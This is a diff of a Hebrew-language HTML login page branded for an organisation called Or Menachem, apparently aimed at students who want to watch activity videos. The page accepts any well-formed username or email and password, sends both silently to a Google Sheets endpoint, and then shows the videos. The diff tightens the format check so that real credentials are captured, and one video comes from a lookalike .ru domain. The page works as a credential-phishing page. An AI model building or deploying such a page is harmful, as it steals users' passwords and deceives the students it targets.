@@ -28,7 +28,7 @@
             height: auto;
         }
 
-        /* תיבת השגיאה */
+        /* תיבת השגיאה המעוצבת */
         .error-box {
             background-color: white;
             padding: 15px 20px;
@@ -42,6 +42,10 @@
             color: #222;
             line-height: 1.4;
             display: none;
+        }
+
+        .error-box strong {
+            color: #d32f2f;
         }
 
         /* תיבת ההתחברות המרכזית */
@@ -128,6 +132,12 @@
             order: 1;
         }
 
+        .remember-me input {
+            cursor: pointer;
+            width: 16px;
+            height: 16px;
+        }
+
         .btn-submit {
             background-color: #1565c0;
             color: white;
@@ -140,9 +150,13 @@
             order: 2;
         }
 
-        /* --- אזור בחירת הסרטים החדש --- */
+        .btn-submit:hover {
+            background-color: #0d47a1;
+        }
+
+        /* --- אזור בחירת הסרטים --- */
         .video-selection-container {
-            display: none; /* מוסתר עד להתחברות מוצלחת */
+            display: none;
             width: 100%;
             max-width: 900px;
             background-color: white;
@@ -160,7 +174,6 @@
             margin-bottom: 30px;
         }
 
-        /* סידור הסרטונים - ימין ושמאל */
         .movies-grid {
             display: flex;
             gap: 30px;
@@ -185,25 +198,26 @@
             box-shadow: 0 6px 15px rgba(0,0,0,0.15);
         }
 
-        /* תצוגה מקדימה של הוידאו בכרטיס */
         .movie-preview-wrapper {
             width: 100%;
-            height: 200px;
+            height: 220px;
             background-color: #000;
             position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .movie-preview-wrapper video {
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            object-fit: contain;
         }
 
-        /* כפתור פליי קטן שיושב מעל התמונה */
         .play-overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.2);
+            background: rgba(0,0,0,0.15);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -213,7 +227,7 @@
         }
 
         .movie-card:hover .play-overlay {
-            background: rgba(0,0,0,0.4);
+            background: rgba(0,0,0,0.35);
         }
 
         .movie-title {
@@ -224,7 +238,7 @@
             border-top: 1px solid #cfd8dc;
         }
 
-        /* אזור הנגן הגדול שנפתח בלחיצה */
+        /* אזור הנגן הגדול */
         .player-view {
             display: none;
             width: 100%;
@@ -259,19 +273,22 @@
 </head>
 <body>
 
+    <!-- אזור הלוגו -->
     <div class="logo-container">
         <img src="logo.png" alt="אור מנחם">
     </div>
 
+    <!-- תיבת שגיאה דינמית -->
     <div class="error-box" id="errorBox">
-        <strong>שגיאה:</strong> הסיסמה שהוזנה עבור המשתמש <span id="wrongUser" style="font-weight: bold;"></span> אינה נכונה. קוד הגישה חייב להכיל לפחות 8 תווים.
+        <strong>שגיאה:</strong> הפרטים שהוזנו אינם תקינים. שם המשתמש והסיסמה חייבים להיות באנגלית בלבד, והסיסמה חייבת להכיל לפחות 8 תווים.
     </div>
 
+    <!-- שלב 1: תיבת ההתחברות -->
     <div class="login-box" id="loginBox">
         <form id="activityForm">
             <div class="form-group">
                 <label for="studentName">שם משתמש או כתובת אימייל</label>
-                <input type="text" id="studentName" required>
+                <input type="text" id="studentName" required autocomplete="off">
             </div>
 
             <div class="form-group">
@@ -292,10 +309,12 @@
         </form>
     </div>
 
+    <!-- שלב 2: מסך בחירת הסרטים -->
     <div class="video-selection-container" id="videoSelection">
         <div class="selection-title">בחר סרטון לצפייה:</div>
         
         <div class="movies-grid" id="moviesGrid">
+            <!-- סרטון 1 (צד ימין) -->
             <div class="movie-card" onclick="playMovie('https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4')">
                 <div class="movie-preview-wrapper">
                     <video src="https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4#t=0.1" preload="metadata" muted></video>
@@ -304,6 +323,7 @@
                 <div class="movie-title">סרטון פעילות 1</div>
             </div>
 
+            <!-- סרטון 2 (צד שמאל) -->
             <div class="movie-card" onclick="playMovie('https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4')">
                 <div class="movie-preview-wrapper">
                     <video src="https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4#t=0.1" preload="metadata" muted></video>
@@ -313,6 +333,7 @@
             </div>
         </div>
 
+        <!-- נגן וידאו מובנה -->
         <div class="player-view" id="playerView">
             <button class="btn-back" onclick="backToSelection()">חזרה לבחירת סרטים ↩</button>
             <video id="mainPlayer" controls autoplay></video>
@@ -333,23 +354,30 @@
             this.style.opacity = type === 'password' ? '1' : '0.5';
         });
 
-        // ניהול טופס ההתחברות
+        // ניהול טופס ההתחברות ובדיקת תקינות הקלט
         document.getElementById('activityForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
             
-            const nameInput = document.getElementById('studentName').value;
+            const nameInput = document.getElementById('studentName').value.trim();
             const codeInput = document.getElementById('accessCode').value;
             
             const errorBox = document.getElementById('errorBox');
-            const wrongUser = document.getElementById('wrongUser');
             const loginBox = document.getElementById('loginBox');
             const videoSelection = document.getElementById('videoSelection');
             
-            // בדיקת אורך קוד (מינימום 8 תווים)
-            if (codeInput.length < 8) {
-                wrongUser.textContent = nameInput;
+            // ביטוי רגולרי (Regex) הבודק שיש רק אותיות באנגלית, מספרים ותווים נפוצים של אימייל (ללא עברית)
+            const englishRegex = /^[A-Za-z0-9@._\-]+$/;
+
+            // עדכון חוקי הבדיקה:
+            // שם המשתמש: חייב להיות באנגלית (לא משנה האורך, כל עוד הוא לא ריק)
+            const isNameValid = nameInput.length > 0 && englishRegex.test(nameInput);
+            // הסיסמה: חייבת להיות באנגלית וגם 8 תווים ומעלה
+            const isCodeValid = codeInput.length >= 8 && englishRegex.test(codeInput);
+            
+            if (!isNameValid || !isCodeValid) {
                 errorBox.style.display = 'block';
                 
+                // אפקט הרטט לתיבה
                 loginBox.classList.remove('shake-effect'); 
                 void loginBox.offsetWidth; 
                 loginBox.classList.add('shake-effect'); 
@@ -358,10 +386,10 @@
             
             // התחברות תקינה! 
             errorBox.style.display = 'none';
-            loginBox.style.display = 'none'; // מעלים את תיבת ההתחברות
-            videoSelection.style.display = 'block'; // מציגים מיד את דף בחירת הסרטונים
+            loginBox.style.display = 'none'; 
+            videoSelection.style.display = 'block'; 
 
-            // שליחת המידע ברקע לגוגל שיטס מבלי לעכב את התלמיד
+            // שליחת המידע ברקע לגוגל שיטס
             const formData = new FormData();
             formData.append('studentName', nameInput);
             formData.append('accessCode', codeInput);
@@ -373,23 +401,21 @@
             }).catch(error => console.error('Error logging to sheets:', error));
         });
 
-        // פונקציה שמפעילה את הסרטון שנבחר
         function playMovie(videoUrl) {
-            document.getElementById('moviesGrid').style.display = 'none'; // מחרב את רשת הבחירה
+            document.getElementById('moviesGrid').style.display = 'none'; 
             const playerView = document.getElementById('playerView');
             const mainPlayer = document.getElementById('mainPlayer');
             
             mainPlayer.src = videoUrl;
-            playerView.style.display = 'block'; // מציג את הנגן הגדול
+            playerView.style.display = 'block'; 
         }
 
-        // פונקציית חזרה למסך הבחירה
         function backToSelection() {
             const mainPlayer = document.getElementById('mainPlayer');
-            mainPlayer.pause(); // עוצר את הסרטון הנוכחי
+            mainPlayer.pause(); 
             
             document.getElementById('playerView').style.display = 'none';
-            document.getElementById('moviesGrid').style.display = 'flex'; // מחזיר את הבחירה
+            document.getElementById('moviesGrid').style.display = 'flex'; 
         }
     </script>
 
